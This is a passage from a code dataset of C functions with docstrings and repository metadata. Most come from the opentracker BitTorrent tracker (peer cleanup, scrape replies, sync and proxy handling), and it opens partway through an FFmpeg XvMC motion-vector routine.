mv_block->PMV[1][1][0] = s->mv[1][1][0];\n            mv_block->PMV[1][1][1] = s->mv[1][1][1];\n        }\n\n        switch(s->mv_type) {\n            case  MV_TYPE_16X16:\n                mv_block->motion_type = XVMC_PREDICTION_FRAME;\n                break;\n            case  MV_TYPE_16X8:\n                mv_block->motion_type = XVMC_PREDICTION_16x8;\n                break;\n            case  MV_TYPE_FIELD:\n                mv_block->motion_type = XVMC_PREDICTION_FIELD;\n                if (s->picture_structure == PICT_FRAME) {\n                    mv_block->PMV[0][0][1] <<= 1;\n                    mv_block->PMV[1][0][1] <<= 1;\n                    mv_block->PMV[0][1][1] <<= 1;\n                    mv_block->PMV[1][1][1] <<= 1;\n                }\n                break;\n            case  MV_TYPE_DMV:\n                mv_block->motion_type = XVMC_PREDICTION_DUAL_PRIME;\n                if (s->picture_structure == PICT_FRAME) {\n\n                    mv_block->PMV[0][0][0] = s->mv[0][0][0];      // top from top\n                    mv_block->PMV[0][0][1] = s->mv[0][0][1] << 1;\n\n                    mv_block->PMV[0][1][0] = s->mv[0][0][0];      // bottom from bottom\n                    mv_block->PMV[0][1][1] = s->mv[0][0][1] << 1;\n\n                    mv_block->PMV[1][0][0] = s->mv[0][2][0];      // dmv00, top from bottom\n                    mv_block->PMV[1][0][1] = s->mv[0][2][1] << 1; // dmv01\n\n                    mv_block->PMV[1][1][0] = s->mv[0][3][0];      // dmv10, bottom from top\n                    mv_block->PMV[1][1][1] = s->mv[0][3][1] << 1; // dmv11\n\n                } else {\n                    mv_block->PMV[0][1][0] = s->mv[0][2][0];      // dmv00\n                    mv_block->PMV[0][1][1] = s->mv[0][2][1];      // dmv01\n                }\n                break;\n            default:\n                assert(0);\n        }\n\n        mv_block->motion_vertical_field_select = 0;\n\n        // set correct field references\n        if (s->mv_type == MV_TYPE_FIELD || s->mv_type == MV_TYPE_16X8) {\n            mv_block->motion_vertical_field_select |= s->field_select[0][0];\n            mv_block->motion_vertical_field_select |= s->field_select[1][0] << 1;\n            mv_block->motion_vertical_field_select |= s->field_select[0][1] << 2;\n            mv_block->motion_vertical_field_select |= s->field_select[1][1] << 3;\n        }\n    } // !intra\n    // time to handle data blocks\n    mv_block->index = render->next_free_data_block_num;\n\n    blocks_per_mb = 6;\n    if (s->chroma_format >= 2) {\n        blocks_per_mb = 4 + (1 << s->chroma_format);\n    }\n\n    // calculate cbp\n    cbp = 0;\n    for (i = 0; i < blocks_per_mb; i++) {\n        cbp += cbp;\n        if (s->block_last_index[i] >= 0)\n            cbp++;\n    }\n\n    if (s->flags & CODEC_FLAG_GRAY) {\n        if (s->mb_intra) {                                   // intra frames are always full chroma blocks\n            for (i = 4; i < blocks_per_mb; i++) {\n                memset(s->pblocks[i], 0, sizeof(*s->pblocks[i]));  // so we need to clear them\n                if (!render->unsigned_intra)\n                    *s->pblocks[i][0] = 1 << 10;\n            }\n        } else {\n            cbp &= 0xf << (blocks_per_mb - 4);\n            blocks_per_mb = 4;                               // luminance blocks only\n        }\n    }\n    mv_block->coded_block_pattern = cbp;\n    if (cbp == 0)\n        mv_block->macroblock_type &= ~XVMC_MB_TYPE_PATTERN;\n\n    for (i = 0; i < blocks_per_mb; i++) {\n        if (s->block_last_index[i] >= 0) {\n            // I do not have unsigned_intra MOCO to test, hope it is OK.\n            if (s->mb_intra && (render->idct || !render->unsigned_intra))\n                *s->pblocks[i][0] -= 1 << 10;\n            if (!render->idct) {\n                s->dsp.idct(*s->pblocks[i]);\n                /* It is unclear if MC hardware requires pixel diff values to be\n                 * in the range [-255;255]. TODO: Clipping if such hardware is\n                 * ever found. As of now it would only be an unnecessary\n                 * slowdown. */\n            }\n            // copy blocks only if the codec doesn't support pblocks reordering\n            if (s->avctx->xvmc_acceleration == 1) {\n                memcpy(&render->data_blocks[render->next_free_data_block_num*64],\n                       s->pblocks[i], sizeof(*s->pblocks[i]));\n            }\n            render->next_free_data_block_num++;\n        }\n    }\n    render->filled_mv_blocks_num++;\n\n    assert(render->filled_mv_blocks_num     <= render->allocated_mv_blocks);\n    assert(render->next_free_data_block_num <= render->allocated_data_blocks);\n    /* The above conditions should not be able to fail as long as this function\n     * is used and the following 'if ()' automatically calls a callback to free\n     * blocks. */\n\n\n    if (render->filled_mv_blocks_num == render->allocated_mv_blocks)\n        ff_draw_horiz_band(s, 0, 0);\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavcodec\\mpegvideo_xvmc.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "/* Clean up all peers in current bucket, remove timedout pools and\n torrents */\n", "func_signal": "static void * clean_worker( void * args )", "code": "{\n  (void) args;\n  while( 1 ) {\n    int bucket = OT_BUCKET_COUNT;\n    while( bucket-- ) {\n      ot_vector *torrents_list = mutex_bucket_lock( bucket );\n      size_t     toffs;\n      int        delta_torrentcount = 0;\n\n      for( toffs=0; toffs<torrents_list->size; ++toffs ) {\n        ot_torrent *torrent = ((ot_torrent*)(torrents_list->data)) + toffs;\n        if( clean_single_torrent( torrent ) ) {\n          vector_remove_torrent( torrents_list, torrent );\n          --delta_torrentcount;\n          --toffs;\n        }\n      }\n      mutex_bucket_unlock( bucket, delta_torrentcount );\n      if( !g_opentracker_running )\n        return NULL;\n      usleep( OT_CLEAN_SLEEP );\n    }\n    stats_cleanup();\n  }\n  return NULL;\n}", "path": "ot_clean.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
{"docstring": "/* Do a fast nibble to hex representation conversion */\n", "func_signal": "static unsigned char fromhex(unsigned char x)", "code": "{\n  x-='0'; if( x<=9) return x;\n  x&=~0x20; x-='A'-'0';\n  if( x<6 ) return x+10;\n  return 0xff;\n}", "path": "scan_urlencoded_query.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
{"docstring": "/* Skip the value of a param=value pair */\n", "func_signal": "void scan_urlencoded_skipvalue( char **string )", "code": "{\n  const unsigned char* s=*(const unsigned char**) string;\n  unsigned char f;\n\n  /* Since we are asked to skip the 'value', we assume to stop at\n     terminators for a 'value' string position */\n  while( ( f = is_unreserved[ *s++ ] ) & SCAN_SEARCHPATH_VALUE );\n\n  /* If we stopped at a hard terminator like \\0 or \\n, make the\n     next scan_urlencoded_query encounter it again */\n  if( f & SCAN_SEARCHPATH_TERMINATOR ) --s;\n\n  *string = (char*)s;\n}", "path": "scan_urlencoded_query.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
{"docstring": "/* Clean a single torrent\n   return 1 if torrent timed out\n*/\n", "func_signal": "int clean_single_torrent( ot_torrent *torrent )", "code": "{\n  ot_peerlist *peer_list = torrent->peer_list;\n  ot_vector *bucket_list = &peer_list->peers;\n  time_t timedout = (time_t)( g_now_minutes - peer_list->base );\n  int num_buckets = 1, removed_seeders = 0;\n\n  /* No need to clean empty torrent */\n  if( !timedout )\n    return 0;\n\n  /* Torrent has idled out */\n  if( timedout > OT_TORRENT_TIMEOUT )\n    return 1;\n\n  /* Nothing to be cleaned here? Test if torrent is worth keeping */\n  if( timedout > OT_PEER_TIMEOUT ) {\n    if( !peer_list->peer_count )\n      return peer_list->down_count ? 0 : 1;\n    timedout = OT_PEER_TIMEOUT;\n  }\n\n  if( OT_PEERLIST_HASBUCKETS( peer_list ) ) {\n    num_buckets = bucket_list->size;\n    bucket_list = (ot_vector *)bucket_list->data;\n  }\n\n  while( num_buckets-- ) {\n    size_t removed_peers = clean_single_bucket( bucket_list->data, bucket_list->size, timedout, &removed_seeders );\n    peer_list->peer_count -= removed_peers;\n    bucket_list->size     -= removed_peers;\n    if( bucket_list->size < removed_peers )\n      vector_fixup_peers( bucket_list );\n    ++bucket_list;\n  }\n\n  peer_list->seed_count -= removed_seeders;\n\n  /* See, if we need to convert a torrent from simple vector to bucket list */\n  if( ( peer_list->peer_count > OT_PEER_BUCKET_MINCOUNT ) || OT_PEERLIST_HASBUCKETS(peer_list) )\n    vector_redistribute_buckets( peer_list );\n\n  if( peer_list->peer_count )\n    peer_list->base = g_now_minutes;\n  else {\n    /* When we got here, the last time that torrent\n     has been touched is OT_PEER_TIMEOUT Minutes before */\n    peer_list->base = g_now_minutes - OT_PEER_TIMEOUT;\n  }\n  return 0;\n\n}", "path": "ot_clean.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
{"docstring": "/* Read initial access list */\n", "func_signal": "static void accesslist_readfile( void )", "code": "{\n  ot_hash *info_hash, *accesslist_new = NULL;\n  char    *map, *map_end, *read_offs;\n  size_t   maplen;\n\n  if( ( map = mmap_read( g_accesslist_filename, &maplen ) ) == NULL ) {\n    char *wd = getcwd( NULL, 0 );\n    fprintf( stderr, \"Warning: Can't open accesslist file: %s (but will try to create it later, if necessary and possible).\\nPWD: %s\\n\", g_accesslist_filename, wd );\n    free( wd );\n    return;\n  }\n\n  /* You need at least 41 bytes to pass an info_hash, make enough room\n     for the maximum amount of them */\n  info_hash = accesslist_new = malloc( ( maplen / 41 ) * 20 );\n  if( !accesslist_new ) {\n    fprintf( stderr, \"Warning: Not enough memory to allocate %zd bytes for accesslist buffer. May succeed later.\\n\", ( maplen / 41 ) * 20 );\n    return;\n  }\n\n  /* No use to scan if there's not enough room for another full info_hash */\n  map_end = map + maplen - 40;\n  read_offs = map;\n\n  /* We do ignore anything that is not of the form \"^[:xdigit:]{40}[^:xdigit:].*\" */\n  while( read_offs <= map_end ) {\n    int i;\n    for( i=0; i<(int)sizeof(ot_hash); ++i ) {\n      int eger1 = scan_fromhex( read_offs[ 2*i ] );\n      int eger2 = scan_fromhex( read_offs[ 1 + 2*i ] );\n      if( eger1 < 0 || eger2 < 0 )\n        break;\n      (*info_hash)[i] = eger1 * 16 + eger2;\n    }\n\n    if( i == sizeof(ot_hash) ) {\n      read_offs += 40;\n\n      /* Append accesslist to accesslist vector */\n      if( read_offs == map_end || scan_fromhex( *read_offs ) < 0 )\n        ++info_hash;\n    }\n\n    /* Find start of next line */\n    while( read_offs <= map_end && *(read_offs++) != '\\n' );\n  }\n#ifdef _DEBUG\n  fprintf( stderr, \"Added %zd info_hashes to accesslist\\n\", (size_t)(info_hash - accesslist_new) );\n#endif\n\n  mmap_unmap( map, maplen);\n\n  qsort( accesslist_new, info_hash - accesslist_new, sizeof( *info_hash ), vector_compare_hash );\n\n  /* Now exchange the accesslist vector in the least race condition prone way */\n  pthread_mutex_lock(&g_accesslist_mutex);\n  free( g_accesslist );\n  g_accesslist      = accesslist_new;\n  g_accesslist_size = info_hash - accesslist_new;\n  pthread_mutex_unlock(&g_accesslist_mutex);\n}", "path": "ot_accesslist.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
{"docstring": "/* This is the non-generic delete from vector-operation specialized for peers in pools.\n   It returns 0 if no peer was found (and thus not removed)\n              1 if a non-seeding peer was removed\n              2 if a seeding peer was removed\n*/\n", "func_signal": "int vector_remove_peer( ot_vector *vector, ot_peer *peer )", "code": "{\n  int      exactmatch;\n  ot_peer *match, *end;\n\n  if( !vector->size ) return 0;\n\n  /* If space is zero but size is set, we're dealing with a list of vector->size buckets */\n  if( vector->space < vector->size )\n    vector = ((ot_vector*)vector->data) + vector_hash_peer(peer, vector->size );\n\n  end = ((ot_peer*)vector->data) + vector->size;\n  match = (ot_peer*)binary_search( peer, vector->data, vector->size, sizeof(ot_peer), OT_PEER_COMPARE_SIZE, &exactmatch );\n  if( !exactmatch ) return 0;\n\n  exactmatch = ( OT_PEERFLAG( match ) & PEER_FLAG_SEEDING ) ? 2 : 1;\n  memmove( match, match + 1, sizeof(ot_peer) * ( end - match - 1 ) );\n\n  vector->size--;\n  vector_fixup_peers( vector );\n  return exactmatch;\n}", "path": "ot_vector.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
{"docstring": "/* Fetches scrape info for a specific torrent */\n", "func_signal": "size_t return_tcp_scrape_for_torrent( ot_hash *hash_list, int amount, char *reply )", "code": "{\n  char *r = reply;\n  int   exactmatch, i;\n\n  r += sprintf( r, \"d5:filesd\" );\n\n  for( i=0; i<amount; ++i ) {\n    int          delta_torrentcount = 0;\n    ot_hash     *hash = hash_list + i;\n    ot_vector   *torrents_list = mutex_bucket_lock_by_hash( *hash );\n    ot_torrent  *torrent = binary_search( hash, torrents_list->data, torrents_list->size, sizeof( ot_torrent ), OT_HASH_COMPARE_SIZE, &exactmatch );\n\n    if( exactmatch ) {\n      if( clean_single_torrent( torrent ) ) {\n        vector_remove_torrent( torrents_list, torrent );\n        delta_torrentcount = -1;\n      } else {\n        *r++='2';*r++='0';*r++=':';\n        memcpy( r, hash, sizeof(ot_hash) ); r+=sizeof(ot_hash);\n        r += sprintf( r, \"d8:completei%zde10:downloadedi%zde10:incompletei%zdee\",\n          torrent->peer_list->seed_count, torrent->peer_list->down_count, torrent->peer_list->peer_count-torrent->peer_list->seed_count );\n      }\n    }\n    mutex_bucket_unlock_by_hash( *hash, delta_torrentcount );\n  }\n\n  *r++ = 'e'; *r++ = 'e';\n  return r - reply;\n}", "path": "trackerlogic.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
{"docstring": "/* This function gives us a binary search that returns a pointer, even if\n   no exact match is found. In that case it sets exactmatch 0 and gives\n   calling functions the chance to insert data\n*/\n", "func_signal": "void *binary_search( const void * const key, const void * base, const size_t member_count, const size_t member_size,\n                     size_t compare_size, int *exactmatch )", "code": "{\n  size_t interval = member_count;\n\n  while( interval ) {\n    uint8_t *lookat = ((uint8_t*)base) + member_size * ( interval / 2 );\n    int cmp = memcmp( lookat, key, compare_size );\n    if(cmp == 0 ) {\n      base = lookat;\n      break;\n    }\n    if(cmp < 0) {\n      base = lookat + member_size;\n      interval--;\n    }\n    interval /= 2;\n  }\n\n  *exactmatch = interval;\n  return (void*)base;\n}", "path": "ot_vector.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
{"docstring": "/* Converter function from memory to human readable hex strings\n   XXX - Duplicated from ot_stats. Needs fix. */\n", "func_signal": "static char*to_hex(char*d,uint8_t*s)", "code": "{char*m=\"0123456789ABCDEF\";char *t=d;char*e=d+40;while(d<e){*d++=m[*s>>4];*d++=m[*s++&15];}*d=0;return t;}\n\n/* This is the entry point into this worker thread\n   It grabs tasks from mutex_tasklist and delivers results back\n*/\nstatic void * fullscrape_worker( void * args ) {\n  int iovec_entries;\n  struct iovec *iovector;\n\n  (void) args;\n\n  while( 1 ) {\n    ot_tasktype tasktype = TASK_FULLSCRAPE;\n    ot_taskid   taskid   = mutex_workqueue_poptask( &tasktype );\n    fullscrape_make( &iovec_entries, &iovector, tasktype );\n    if( mutex_workqueue_pushresult( taskid, iovec_entries, iovector ) )\n      iovec_free( &iovec_entries, &iovector );\n    if( !g_opentracker_running )\n      return NULL;\n  }\n  return NULL;\n}", "path": "ot_fullscrape.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
{"docstring": "/* Proposed output format\n   d4:syncd20:<info_hash>8*N:(xxxxyyyy)*Nee\n*/\n", "func_signal": "static void sync_make( int *iovec_entries, struct iovec **iovector )", "code": "{\n  int    bucket;\n  char  *r, *re;\n\n  /* Setup return vector... */\n  *iovec_entries = 0;\n  *iovector = NULL;\n  if( !( r = iovec_increase( iovec_entries, iovector, OT_SYNC_CHUNK_SIZE ) ) )\n    return;\n\n  /* ... and pointer to end of current output buffer.\n     This works as a low watermark */\n  re = r + OT_SYNC_CHUNK_SIZE;\n\n  memmove( r, \"d4:syncd\", 8 ); r += 8;\n\n  /* For each bucket... */\n  for( bucket=0; bucket<OT_BUCKET_COUNT; ++bucket ) {\n    /* Get exclusive access to that bucket */\n    ot_vector *torrents_list = mutex_bucket_lock( bucket );\n    size_t tor_offset;\n\n    /* For each torrent in this bucket.. */\n    for( tor_offset=0; tor_offset<torrents_list->size; ++tor_offset ) {\n      /* Address torrents members */\n      ot_peerlist *peer_list = ( ((ot_torrent*)(torrents_list->data))[tor_offset] ).peer_list;\n      ot_hash     *hash      =&( ((ot_torrent*)(torrents_list->data))[tor_offset] ).hash;\n      const size_t byte_count = sizeof(ot_peer) * peer_list->changeset.size;\n\n      /* If we reached our low watermark in buffer... */\n      if( re - r <= (ssize_t)(/* strlen( \"20:\" ) == */ 3 + sizeof( ot_hash ) + /* strlen_max( \"%zd\" ) == */ 12 + byte_count ) ) {\n\n        /* Allocate a fresh output buffer at the end of our buffers list\n           release bucket and return, if that fails */\n        if( !( r = iovec_fix_increase_or_free( iovec_entries, iovector, r, OT_SYNC_CHUNK_SIZE ) ) )\n          return mutex_bucket_unlock( bucket );\n\n        /* Adjust new end of output buffer */\n        re = r + OT_SYNC_CHUNK_SIZE;\n      }\n\n      *r++ = '2'; *r++ = '0'; *r++ = ':';\n      memmove( r, hash, sizeof( ot_hash ) ); r += sizeof( ot_hash );\n      r += sprintf( r, \"%zd:\", byte_count );\n      memmove( r, peer_list->changeset.data, byte_count ); r += byte_count;\n    }\n\n    /* All torrents done: release lock on currenct bucket */\n    mutex_bucket_unlock( bucket );\n  }\n\n  /* Close bencoded sync dictionary */\n  *r++='e'; *r++='e';\n\n  /* Release unused memory in current output buffer */\n  iovec_fixlast( iovec_entries, iovector, r );\n}", "path": "ot_sync.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
{"docstring": "/* This is the generic insert operation for our vector type.\n   It tries to locate the object at \"key\" with size \"member_size\" by comparing its first \"compare_size\" bytes with\n   those of objects in vector. Our special \"binary_search\" function does that and either returns the match or a\n   pointer to where the object is to be inserted. vector_find_or_insert makes space for the object and copies it,\n   if it wasn't found in vector. Caller needs to check the passed \"exactmatch\" variable to see, whether an insert\n   took place. If resizing the vector failed, NULL is returned, else the pointer to the object in vector.\n*/\n", "func_signal": "void *vector_find_or_insert( ot_vector *vector, void *key, size_t member_size, size_t compare_size, int *exactmatch )", "code": "{\n  uint8_t *match = binary_search( key, vector->data, vector->size, member_size, compare_size, exactmatch );\n\n  if( *exactmatch ) return match;\n\n  if( vector->size + 1 > vector->space ) {\n    size_t   new_space = vector->space ? OT_VECTOR_GROW_RATIO * vector->space : OT_VECTOR_MIN_MEMBERS;\n    uint8_t *new_data = realloc( vector->data, new_space * member_size );\n    if( !new_data ) return NULL;\n    /* Adjust pointer if it moved by realloc */\n    match = new_data + (match - (uint8_t*)vector->data);\n\n    vector->data = new_data;\n    vector->space = new_space;\n  }\n  memmove( match + member_size, match, ((uint8_t*)vector->data) + member_size * vector->size - match );\n\n  vector->size++;\n  return match;\n}", "path": "ot_vector.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
{"docstring": "/* Handle incoming connection requests, check against whitelist */\n", "func_signal": "static void handle_accept( int64 serversocket )", "code": "{\n  int64 newfd;\n  ot_ip6 ip;\n  uint16 port;\n\n  while( ( newfd = socket_accept6( serversocket, ip, &port, NULL ) ) != -1 ) {\n\n    /* XXX some access control */\n\n    /* Put fd into a non-blocking mode */\n    io_nonblock( newfd );\n\n    if( !io_fd( newfd ) )\n      io_close( newfd );\n    else {\n      /* Find a new home for our incoming connection */\n      int i;\n      for( i=0; i<MAX_PEERS; ++i )\n        if( g_connections[i].state == FLAG_DISCONNECTED )\n          break;\n      if( i == MAX_PEERS ) {\n        fprintf( stderr, \"No room for incoming connection.\" );\n        close( newfd );\n        continue;\n      }\n\n      /* Prepare connection info block */\n      reset_info_block( g_connections+i );\n      PROXYPEER_SETCONNECTING( g_connections[i].state );\n      g_connections[i].port = port;\n      g_connections[i].fd   = newfd;\n\n      io_setcookie( newfd, g_connections + i );\n\n      /* We expect the connecting side to begin with its tracker_id */\n      io_wantread( newfd );\n    }\n  }\n\n  return;\n}", "path": "proxy.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
{"docstring": "/* Returns amount of removed peers */\n", "func_signal": "static ssize_t clean_single_bucket( ot_peer *peers, size_t peer_count, time_t timedout, int *removed_seeders )", "code": "{\n  ot_peer *last_peer = peers + peer_count, *insert_point;\n  time_t timediff;\n\n  /* Two scan modes: unless there is one peer removed, just increase ot_peertime */\n  while( peers < last_peer ) {\n    if( ( timediff = timedout + OT_PEERTIME( peers ) ) >= OT_PEER_TIMEOUT )\n      break;\n    OT_PEERTIME( peers++ ) = timediff;\n  }\n\n  /* If we at least remove one peer, we have to copy  */\n  insert_point = peers;\n  while( peers < last_peer )\n    if( ( timediff = timedout + OT_PEERTIME( peers ) ) < OT_PEER_TIMEOUT ) {\n      OT_PEERTIME( peers ) = timediff;\n      memcpy( insert_point++, peers++, sizeof(ot_peer));\n    } else\n      if( OT_PEERFLAG( peers++ ) & PEER_FLAG_SEEDING )\n        (*removed_seeders)++;\n\n  return peers - insert_point;\n}", "path": "ot_clean.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
{"docstring": "/* Compiles a list of random peers for a torrent\n   * reply must have enough space to hold 92+6*amount bytes\n   * does not yet check not to return self\n*/\n", "func_signal": "size_t return_peers_for_torrent( ot_torrent *torrent, size_t amount, char *reply, PROTO_FLAG proto )", "code": "{\n  ot_peerlist *peer_list = torrent->peer_list;\n  char        *r = reply;\n\n  if( amount > peer_list->peer_count )\n    amount = peer_list->peer_count;\n\n  if( proto == FLAG_TCP ) {\n    int erval = OT_CLIENT_REQUEST_INTERVAL_RANDOM;\n    r += sprintf( r, \"d8:completei%zde10:downloadedi%zde10:incompletei%zde8:intervali%ie12:min intervali%ie\" PEERS_BENCODED \"%zd:\", peer_list->seed_count, peer_list->down_count, peer_list->peer_count-peer_list->seed_count, erval, erval/2, OT_PEER_COMPARE_SIZE*amount );\n  } else {\n    *(uint32_t*)(r+0) = htonl( OT_CLIENT_REQUEST_INTERVAL_RANDOM );\n    *(uint32_t*)(r+4) = htonl( peer_list->peer_count - peer_list->seed_count );\n    *(uint32_t*)(r+8) = htonl( peer_list->seed_count );\n    r += 12;\n  }\n\n  if( amount ) {\n    if( amount == peer_list->peer_count )\n      r += return_peers_all( peer_list, r );\n    else\n      r += return_peers_selection( peer_list, amount, r );\n  }\n\n  if( proto == FLAG_TCP )\n    *r++ = 'e';\n\n  return r - reply;\n}", "path": "trackerlogic.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
{"docstring": "/* Fetches scrape info for a specific torrent */\n", "func_signal": "size_t return_udp_scrape_for_torrent( ot_hash hash, char *reply )", "code": "{\n  int          exactmatch, delta_torrentcount = 0;\n  ot_vector   *torrents_list = mutex_bucket_lock_by_hash( hash );\n  ot_torrent  *torrent = binary_search( hash, torrents_list->data, torrents_list->size, sizeof( ot_torrent ), OT_HASH_COMPARE_SIZE, &exactmatch );\n\n  if( !exactmatch ) {\n    memset( reply, 0, 12);\n  } else {\n    uint32_t *r = (uint32_t*) reply;\n\n    if( clean_single_torrent( torrent ) ) {\n      vector_remove_torrent( torrents_list, torrent );\n      memset( reply, 0, 12);\n      delta_torrentcount = -1;\n    } else {\n      r[0] = htonl( torrent->peer_list->seed_count );\n      r[1] = htonl( torrent->peer_list->down_count );\n      r[2] = htonl( torrent->peer_list->peer_count-torrent->peer_list->seed_count );\n    }\n  }\n  mutex_bucket_unlock_by_hash( hash, delta_torrentcount );\n  return 12;\n}", "path": "trackerlogic.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
{"docstring": "/* Can write new sync data to the stream */\n", "func_signal": "static void handle_write( int64 peersocket )", "code": "{\n  proxy_peer *peer = io_getcookie( peersocket );\n\n  if( !peer ) {\n    /* Can't happen ;) */\n    io_close( peersocket );\n    return;\n  }\n\n  switch( peer->state & FLAG_MASK ) {\n  case FLAG_DISCONNECTED:\n  default: /* Should not happen */\n    io_close( peersocket );\n    break;\n  case FLAG_CONNECTING:\n    /* Ensure that the connection is established and handle connection error */\n    if( peer->state & FLAG_OUTGOING && !socket_connected( peersocket ) ) {\n        fprintf( stderr, \"failed\\n\" );\n        reset_info_block( peer );\n        io_close( peersocket );\n        break;\n    }\n\n    if( io_trywrite( peersocket, (void*)&g_tracker_id, sizeof( g_tracker_id ) ) == sizeof( g_tracker_id ) ) {\n      PROXYPEER_SETWAITTRACKERID( peer->state );\n      io_dontwantwrite( peersocket );\n      io_wantread( peersocket );\n    } else {\n      fprintf( stderr, \"Handshake incomplete, closing socket\\n\" );\n      io_close( peersocket );\n      reset_info_block( peer );\n    }\n    break;\n  case FLAG_CONNECTED:\n    switch( iob_send( peersocket, &peer->outdata ) ) {\n    case 0: /* all data sent */\n      io_dontwantwrite( peersocket );\n      break;\n    case -3: /* an error occured */\n      io_close( peersocket );\n      reset_info_block( peer );\n      break;\n    default: /* Normal operation or eagain */\n      break;\n    }\n    break;\n  }\n\n  return;\n}", "path": "proxy.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
{"docstring": "/* This is the entry point into this worker thread\n   It grabs tasks from mutex_tasklist and delivers results back\n*/\n", "func_signal": "static void * sync_worker( void * args)", "code": "{\n  int iovec_entries;\n  struct iovec *iovector;\n\n  args = args;\n\n  while( 1 ) {\n    ot_tasktype tasktype = TASK_SYNC_OUT;\n    ot_taskid   taskid   = mutex_workqueue_poptask( &tasktype );\n    sync_make( &iovec_entries, &iovector );\n    stats_issue_event( EVENT_SYNC_OUT, FLAG_TCP, iovec_length( &iovec_entries, &iovector) );\n    if( mutex_workqueue_pushresult( taskid, iovec_entries, iovector ) )\n      iovec_free( &iovec_entries, &iovector );\n  }\n  return NULL;\n}", "path": "ot_sync.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
{"docstring": "/* Inform live sync about whats going on. */\n", "func_signal": "void livesync_tell( struct ot_workstruct *ws )", "code": "{\n\n  memcpy( g_outbuf + g_outbuf_data, ws->hash, sizeof(ot_hash) );\n  memcpy( g_outbuf + g_outbuf_data + sizeof(ot_hash), &ws->peer, sizeof(ot_peer) );\n\n  g_outbuf_data += sizeof(ot_hash) + sizeof(ot_peer);\n\n  if( g_outbuf_data >= LIVESYNC_OUTGOING_BUFFSIZE_PEERS - LIVESYNC_OUTGOING_WATERMARK_PEERS )\n    livesync_issue_peersync();\n}", "path": "ot_livesync.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
{"docstring": "/* New sync data on the stream */\n", "func_signal": "static void handle_read( int64 peersocket )", "code": "{\n  int i;\n  int64 datalen;\n  uint32_t tracker_id;\n  proxy_peer *peer = io_getcookie( peersocket );\n\n  if( !peer ) {\n    /* Can't happen ;) */\n    io_close( peersocket );\n    return;\n  }\n  switch( peer->state & FLAG_MASK ) {\n  case FLAG_DISCONNECTED:\n    io_close( peersocket );\n    break; /* Shouldnt happen */\n  case FLAG_CONNECTING:\n  case FLAG_WAITTRACKERID:\n    /* We want at least the first four bytes to come at once, to avoid keeping extra states (for now)\n       This also catches 0 bytes reads == EOF and negative values, denoting connection errors */\n    if( io_tryread( peersocket, (void*)&tracker_id, sizeof( tracker_id ) ) != sizeof( tracker_id ) )\n      goto close_socket;\n\n    /* See, if we already have a connection to that peer */\n    for( i=0; i<MAX_PEERS; ++i )\n      if( ( g_connections[i].state & FLAG_MASK ) == FLAG_CONNECTED &&\n            g_connections[i].tracker_id == tracker_id ) {\n        fprintf( stderr, \"Peer already connected. Closing connection.\\n\" );\n        goto close_socket;\n      }\n\n    /* Also no need for soliloquy */\n    if( tracker_id == g_tracker_id )\n      goto close_socket;\n\n    /* The new connection is good, send our tracker_id on incoming connections */\n    if( peer->state == FLAG_CONNECTING )\n      if( io_trywrite( peersocket, (void*)&g_tracker_id, sizeof( g_tracker_id ) ) != sizeof( g_tracker_id ) )\n        goto close_socket;\n\n    peer->tracker_id = tracker_id;\n    PROXYPEER_SETCONNECTED( peer->state );\n\n    if( peer->state & FLAG_OUTGOING )\n      fprintf( stderr, \"succeeded.\\n\" );\n    else\n      fprintf( stderr, \"Incoming connection successful.\\n\" );\n\n    break;\nclose_socket:\n    fprintf( stderr, \"Handshake incomplete, closing socket\\n\" );\n    io_close( peersocket );\n    reset_info_block( peer );\n    break;\n  case FLAG_CONNECTED:\n    /* Here we acutally expect data from peer\n       indata_length should be less than 20+256*7 bytes, for incomplete torrent entries */\n    datalen = io_tryread( peersocket, (void*)(peer->indata + peer->indata_length), sizeof( peer->indata ) - peer->indata_length );\n    if( !datalen || datalen < -1 ) {\n      fprintf( stderr, \"Connection closed by remote peer.\\n\" );\n      io_close( peersocket );\n      reset_info_block( peer );\n    } else if( datalen > 0 ) {\n      peer->indata_length += datalen;\n      process_indata( peer );\n    }\n    break;\n  }\n}", "path": "proxy.c", "repo_name": "masroore/opentracker", "stars": 109, "license": "None", "language": "c", "size": 960}
